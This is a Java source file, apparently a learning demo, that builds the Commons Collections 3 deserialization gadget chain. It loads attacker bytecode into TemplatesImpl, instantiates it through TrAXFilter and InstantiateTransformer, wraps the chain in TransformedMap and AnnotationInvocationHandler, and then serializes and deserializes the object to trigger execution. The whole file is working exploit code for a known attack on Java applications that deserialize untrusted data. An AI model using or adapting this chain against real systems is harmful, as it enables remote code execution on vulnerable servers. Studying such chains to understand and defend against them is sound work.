package com.testdemo;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class cc3demo {
    public static void main(String[] args) throws TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException {
        TemplatesImpl templatesImpl = new TemplatesImpl();
        Class clz = templatesImpl.getClass();

        Field nameField = clz.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templatesImpl, "123");

        Field bytecodesField = clz.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E:\\tools\\dev-tools\\javacc1_1\\target\\classes\\com\\testdemo\\Runtimedemo.class"));
        byte[][] codes = {code};
        bytecodesField.set(templatesImpl, codes);

//        Field tfactoryField = clz.getDeclaredField("_tfactory");
//        tfactoryField.setAccessible(true);
//        tfactoryField.set(templatesImpl, new TransformerFactoryImpl());

//        templatesImpl.newTransformer();

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})
        };
//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl});
//        instantiateTransformer.transform(TrAXFilter.class);
//        InvocationHandler
//        Proxy
        ChainedTransformer chain = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "1");
        Map<Object, Object> transformedmap = TransformedMap.decorate(map, null, chain);


        Class an = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = an.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transformedmap);
//        serialize(o);
        unserialize("ser.bin");
    }


    public static void serialize(Object o) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(o);
    }
    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}
